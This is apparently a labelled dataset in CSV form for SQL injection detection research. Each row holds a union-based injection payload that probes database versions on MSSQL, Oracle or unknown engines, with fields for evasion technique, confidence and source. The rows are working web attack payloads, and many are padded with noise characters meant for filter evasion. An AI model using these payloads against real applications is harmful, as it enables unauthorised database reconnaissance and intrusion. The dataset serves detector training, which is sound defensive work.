payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"select * from users where id = 1 ||1 union select 1,banner from v$version where rownum = 1 -- 1",union_based,oracle,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 ||1 union select null,banner from v$version where rownum = 1 -- 1",union_based,oracle,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1<@ = 1 union select 1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or \+<\ union select 1,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 or \+<$ union select 1,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1&@# = 1 union select 1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or $ . = 1 union select 1,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 or $ 1 = 1 union select 1,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 or $<\. union select 1,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 or $<\ union select 1,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 or $+<1 union select 1,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 or $+<\ union select 1,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 or $+<$ union select 1,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 or \<\. union select 1,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 or \<1 union select 1,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 or \<\ union select 1,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 or \<\ union select null,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 or \<$ union select 1,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 or \< = 1 union select 1,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 or !<@ union select 1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or @`\` union select 1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or @$# = 1 union select 1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or @<@ = 1 union select 1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 + ( \ ) union select null,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1.&&1 union select 1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1.&&@ union select 1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 + ( \. ) union select null,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1. union select 1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1. union select 1,banner from v$version where rownum = 1 -- 1",union_based,oracle,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1. union select version ( ) ,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1. union select null,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 +\. union select null,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1. union select null,banner from v$version where rownum = 1 -- 1",union_based,oracle,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1.<@. union select 1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1.*1 union select 1,banner from v$version where rownum = 1 -- 1",union_based,oracle,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1.<1# union select 1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1. <@ union select 1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1. <@ union select version ( ) ,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1.*\ union select null,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1.<@$ union select 1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1.%@ union select 1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 11||1 union select 1,banner from v$version where rownum = 1 -- 1",union_based,oracle,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 + ( 1 ) union select 1,banner from v$version where rownum = 1 -- 1",union_based,oracle,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 + ( 1 ) union select null,banner from v$version where rownum = 1 -- 1",union_based,oracle,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 +1 union select 1,banner from v$version where rownum = 1 -- 1",union_based,oracle,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 +1 union select null,banner from v$version where rownum = 1 -- 1",union_based,oracle,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 11<1# union select 1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 + ( \+ ) union select null,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 +\+. union select null,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 -1<@ union select 1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 +1<@ union select version ( ) ,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 +1<@ union select null,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 + \+%1 union select null,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 + \+*\ union select null,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 + \+*$ union select null,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 union select ( 1 ) ,banner from v$version where rownum = 1 -- 1",union_based,oracle,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 union select 1||1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 union select 1||@,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 union select 1 1$,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 union select 1 $,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 union select 1 1a,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 union select 1<@$,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 union select 1,banner from v$version where rownum = 1 -- 1",union_based,oracle,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 union select .1_,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 union select 1`\`,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 union select 1a#,banner from v$version where rownum = 1 -- 1",union_based,oracle,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 union select 1a,banner from v$version where rownum = 1 -- 1",union_based,oracle,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 union select .1$_,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 union select 1<@,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 union select 1<@.,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 union select 1 $$,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 union select !<1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 union select +!<1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 union select +!<@,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 union select !<@,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 union select @||1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 union select @&&@,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 union select @ 1$,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 union select @ $,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 union select @ 1a,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 union select @<@$,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 union select null,banner from v$version where rownum = 1 -- 1",union_based,oracle,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 union select @ _,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 union select @ $_,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 union select @<@,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 union select @<@.,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 union select @ $$,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 +$ . union select null,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 +$ 1 union select null,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 + ( $+ ) union select null,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 +$+. union select null,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 +$+ union select null,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 + $+%1 union select null,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 + $+*\ union select null,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 + $+*$ union select null,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 * ( \ ) union select null,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 * ( 1 ) union select 1,banner from v$version where rownum = 1 -- 1",union_based,oracle,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1<@.. union select 1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 <@. union select 1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 <@. union select version ( ) ,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 *\. union select null,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 <@.$ union select 1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 *1 union select 1,banner from v$version where rownum = 1 -- 1",union_based,oracle,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 *1 union select null,banner from v$version where rownum = 1 -- 1",union_based,oracle,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 <1## union select 1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 <@1$ union select 1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 *\ union select null,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 *$ . union select null,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 %$ 1 union select null,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 <@$_ union select 1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1<@<@ union select 1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 <@<@ union select version ( ) ,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 <@<@ union select null,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 <@&@ union select 1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 <@$$ union select 1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = '1' or ||/1 = 1 union select 1,version ( ) -- 1'",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = '1' or ( \ ) = 1 union select 1,@@VERSION -- 1'",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = '1' or ( \. ) = 1 union select 1,@@VERSION -- 1'",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = '1' or ( 1 ) = 1 union select 1,banner from v$version where rownum = 1 -- 1'",union_based,oracle,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = '1' or \.<1 union select 1,@@VERSION -- 1'",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = '1' or \.<\ union select 1,@@VERSION -- 1'",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = '1' or \.<$ union select 1,@@VERSION -- 1'",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = '1' or \.< = 1 union select 1,@@VERSION -- 1'",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = '1' ||1 union select 1,banner from v$version where rownum = 1 -- 1'",union_based,oracle,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = '1' or 1^ = 1 union select 1,banner from v$version where rownum = 1 -- 1'",union_based,oracle,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = '1' or $ . = 1 union select 1,@@VERSION -- 1'",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = '1' or $ 1 = 1 union select 1,@@VERSION -- 1'",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = '1' or $<\. union select 1,@@VERSION -- 1'",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = '1' or $<\ union select 1,@@VERSION -- 1'",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = '1' or \<\. union select 1,@@VERSION -- 1'",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = '1' or !<1 union select 1,version ( ) -- 1'",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = '1' or \<\ union select 1,@@VERSION -- 1'",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = '1' or \<$ union select 1,@@VERSION -- 1'",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = '1' or \< = 1 union select 1,@@VERSION -- 1'",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = '1' or !<@ union select 1,version ( ) -- 1'",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = '1' or @ ( 1 ) = 1 union select 1,version ( ) -- 1'",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = '1' or @ 1 = 1 union select 1,version ( ) -- 1'",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = '1' or @ @1 = 1 union select 1,version ( ) -- 1'",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1#"" ( union select 1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1#"" ( union select version ( ) ,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1#"" ( union select 'a',version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1#"" ( union select null,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or @#"" ( = 1 union select 1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1#"", union select 1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1#"", union select version ( ) ,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1#"", union select 'a',version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1#"", union select null,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or @#"", = 1 union select 1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1#"". union select 1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1#"". union select version ( ) ,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1#"". union select 'a',version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1#"". union select null,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1#"". = 1 union select 1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1#""1 union select 1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1#""1 union select version ( ) ,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1#""1 union select 'a',version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1#""1 union select null,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = '1' or """"<@ union select 1,version ( ) -- 1'",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1#""; union select 1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1#""; union select version ( ) ,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1#""; union select 'a',version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1#""; union select null,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1#""; = 1 union select 1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = '1' union select "";""_,version ( ) -- 1'",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = '1' union select $[""],@@VERSION -- 1'",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1#""? union select 1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1#""? union select version ( ) ,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1#""? union select 'a',version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1#""? union select null,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1#""? = 1 union select 1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = '1' union select ""?""_,version ( ) -- 1'",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = '1' union select ||/1,version ( ) -- 1'",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = '1' union select ( \ ) ,@@VERSION -- 1'",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = '1' union select ( \. ) ,@@VERSION -- 1'",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = '1' union select ( 1 ) ,banner from v$version where rownum = 1 -- 1'",union_based,oracle,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = '1' union select \,@@VERSION -- 1'",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = '1' union select \.,@@VERSION -- 1'",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = '1' union select \.#,@@VERSION -- 1'",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = '1' union select \.%1,@@VERSION -- 1'",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = '1' union select 1,banner from v$version where rownum = 1 -- 1'",union_based,oracle,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = '1' union select 1a,banner from v$version where rownum = 1 -- 1'",union_based,oracle,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = '1' union select 1""!"",banner from v$version where rownum = 1 -- 1'",union_based,oracle,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = '1' union select \#,@@VERSION -- 1'",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = '1' union select $ .,@@VERSION -- 1'",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = '1' union select $ _,@@VERSION -- 1'",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = '1' union select $*$,@@VERSION -- 1'",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = '1' union select +\,@@VERSION -- 1'",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = '1' union select +\.,@@VERSION -- 1'",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = '1' union select !<1,version ( ) -- 1'",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = '1' union select +\#,@@VERSION -- 1'",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = '1' union select !<@,version ( ) -- 1'",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = '1' union select @ 1,version ( ) -- 1'",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
